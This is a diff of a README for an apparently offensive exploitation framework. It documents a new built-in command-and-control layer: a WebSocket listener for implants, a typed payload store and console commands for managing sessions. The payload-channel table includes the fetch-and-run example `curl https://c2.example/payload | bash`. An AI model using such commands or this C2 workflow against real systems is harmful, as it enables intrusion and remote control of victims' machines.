@@ -45,10 +45,12 @@ Eidolon is built on four deliberate refusals:
    delivered — shellcode path, executable, shell command, raw source, anything else —
    comes from the operator through four social-contract channels (below). The framework
    enforces nothing and judges nothing.
-3. **C2 is always external.** Eidolon owns the exploit chain up to execution. Post-
-   exploitation belongs to a dedicated C2 of your choice (Sliver, or a future companion
-   framework). Hand-off is the module author's decision, expressed through the payload
-   channels.
+3. **The C2 is a separate layer.** Eidolon owns the exploit chain up to execution,
+   then hands off. Since 3.2.2 that layer ships *inside the framework* as **Wraith**
+   (a self-contained `wraith/` package: async WebSocket listener +
+   typed payload store) — but the import boundary is real: `eidolon/` never imports
+   `wraith/`, exploits never speak C2, and pointing a payload at Sliver or any other
+   C2 instead remains a legitimate, first-class choice.
 4. **Trust is earned, never assumed.** Downloads are verified by SHA-256 when the index
    provides it, and *cannot* proceed silently when it doesn't. First run of any module is
    recorded as untrusted (TOFU — Trust On First Use).
@@ -167,8 +169,36 @@ enforced API:
 | `CMD` | a shell command (`curl https://c2.example/payload \| bash`, …) |
 | `PAYLOAD_SRC` | raw source / anything else the module author dreams up |
 
-This keeps Eidolon agnostic about C2s: point `CMD` at Sliver's implant generator, at a
-WebSocket listener, at whatever comes next — the module just delivers it.
+This keeps Eidolon agnostic about C2s: point `CMD` at Sliver's implant generator, at the
+built-in **Wraith** listener (below), at a WebSocket listener, at whatever comes next —
+the module just delivers it.
+
+### Payload integration with the built-in C2 — the dedicated `payload` field
+
+Payloads in the store carry a **type** and a wire **protocol tag**. An exploit asks
+for one by declaring a single dedicated option field — the framework validates on
+`set`, filters by type, and hands `run()` the resolved manifest instead of a string:
+
+```python
+OPTIONS = {"payload": {"value": "", "required": False,
+                       "desc":  "payload name from `c2 payloads`, or any raw file path",
+                       "kind":  "payload",                 # framework-managed field
+                       "types": ("file-posix", "file-win")}}
+
+def run(opts):
+    artifact = opts["payload"]["path"]          # ready to deliver
+    opts["payload"]["type"]                   # "file-posix" — the store guarantees it
+    opts["payload"]["protocol"]               # "ws-json-async" — its wire dialect
+```
+
+`set payload ghost-go` fails on the spot if `ghost-go` is not one of the declared
+types — a wrong artifact can never slip into the wrong delivery path. A raw file
+path always passes (freedom) and arrives typed `"external"`. Under the hood this is
+`wraith.store.resolve_payload()`, which any module may call directly.
+```
+
+Raw operator files (any path) stay first-class: they resolve with type `"external"`
+and the module stays authoritative. Freedom by default, typing when you want it.
 
 ### Multi-file modules
 
@@ -197,6 +227,91 @@ alone — no registration ceremony, no manifest. Archive only `.py` files you wa
 shipped (the packer skips `_*`, `@*`, dotfiles, and `__pycache__`).
 
 ---
+
+## 👻 Wraith — the built-in C2 layer (new in 3.2.2)
+
+A complete command-and-control layer that lives inside the repository as one
+self-contained package — `wraith/` — **never imported by the exploit engine**:
+
+- **Async WebSocket listener** — its own asyncio loop on its own thread; fully
+  non-blocking task multiplexing
+- **JSON wire protocol** — one object per frame, spec + validation in
+  `wraith/protocol.py`
+- **Builders are modules, not framework code** — the repository ships **zero**
+  payload sources and **zero** compilers. A payload builder is simply a module of
+  type `payload`: its sources sit beside the module script, the script produces
+  the artifact in *any* language it pleases (Go, Nim, C, Rust, C#, bash, python,
+  PowerShell…), embeds the listener profile (URL + token + tags) however it
+  likes, and registers it in the store — exploits pick it up by name, type-filtered.
+- **Typed payload store** — every artifact labeled (file-posix / file-win /
+  shellcode / cmd / code) with a SHA-256 manifest
+- **Protocol-tag handshake** — listener and payload must share a wire-dialect tag
+  (e.g. `ws-json-async`) or they are refused to ever speak to each other
+
+### The two-second workflow
+
+```
+eidolon ❯ c2 serve                      ⬢ listener online (async + hidden endpoint)
+eidolon ❯ use ghost-implant             (a payload-type module — builds + registers)
+eidolon ❯ run                            ⬢ stored: ghost-go [file-posix] · ws-json-async
+... exploit module delivers the binary to the target ...
+  ⬢ payload connected  5f8e12c2 · alice@corp-ws · go/linux-amd64 · 10.4.2.9:51515
+eidolon ❯ c2 sessions                   (live table — ● active, ○ lost)
+```
+
+The instant a payload dials home, the console reports it — timestamped identity,
+target user, host, implant flavor and address.
+
+### Commands
+
+| Command | Effect |
+|---|---|
+| `c2 serve [--host H] [--port N] [--token T] [--path P] [--tags T1,T2] [--tls]` | bring the listener up — token + random `/api/v2/streams/<hex>` endpoint auto-generated; wrong token/path = instant `4401` drop |
+| `c2 status` | listener state, protocol tags, session counts |
+| `c2 sessions` | live session table (active / lost) |
+| `c2 payloads` | the typed payload store (name · type · protocol · backend · sha256) |
+| `c2 stop` | clean shutdown (also happens automatically on `exit`) |
+
+### The protocol-tag handshake
+
+Every listener announces the wire dialects it speaks; every payload announces the
+ones it understands. **They connect only on a common tag** — otherwise the
+handshake dies with close code `4403` (and a payload registered under a foreign
+dialect simply never matches an exploit's store filter — the wrong pairing
+cannot happen by accident):
+
+```
+  listener: tags = {ws-json-async}          (c2 serve --tags a,b — any count)
+  payload : tags = {ws-json-async}          (embedded at build time)
+  → connect only on ws-json-async ∩ tags ≠ ∅
+```
+
+One tag in practice, two at most — but the capability space is unbounded, so a
+future dialect (`ws-framed-binary`, …) can coexist with the old one on the same
+box without a single misconnected implant. Remote indexes can pin the dialect of
+a published module with the optional `"protocol"` / `"payload_type"` fields.
+
+### Architecture — four small files, one folder
+
+```
+wraith/
+  protocol.py   the wire contract — frame spec, limits, tag vocabulary
+  sessions.py   thread-safe session registry (identity, state, result history)
+  listener.py   the async listener — auth (token ∩ path), TLS (self-minted cert
+                or yours), chunked file reassembly, pty plumbing, event feed
+  store.py      typed payload store + resolve_payload() type gateway
+```
+
+Builders live with the modules (`~/.eidolon/modules/<builder>/`) — outside the
+framework, exactly where a payload author wants them.
+
+New dependency: `websockets>=11`. TLS is optional (`cryptography` mints an
+ephemeral self-signed certificate when you don't bring one). Uploaded/downloaded
+files stream in 256 KB base64 chunks (10 MB cap); frames are capped at 1 MB;
+argv is sanitized (≤128 × 4 KB); outputs clamp at 512 KB. Sessions are marked
+`lost` on disconnect and never crash the listener.
+
+------
 
 ## 🛰️ Repository System
 
@@ -322,8 +437,9 @@ between runs.
 - Test suite + CI (the install/AES/trust flows are verified end-to-end manually; they
   are being landed as automated tests)
 - `ENFORCE_SHA256 = True` — hard-block hashless archives in an upcoming release
-- **Wraith** — planned companion framework: a minimal WebSocket listener and payload
-  builder speaking a small, documented API for Eidolon hand-off
+- **Wraith** — ✅ shipped in 3.2.2: the C2 subsystem now lives in-repo (async
+  WebSocket/JSON listener, typed payload store, protocol-tag handshake,
+  builders as payload modules). Next: session persistence
 
 ---
 
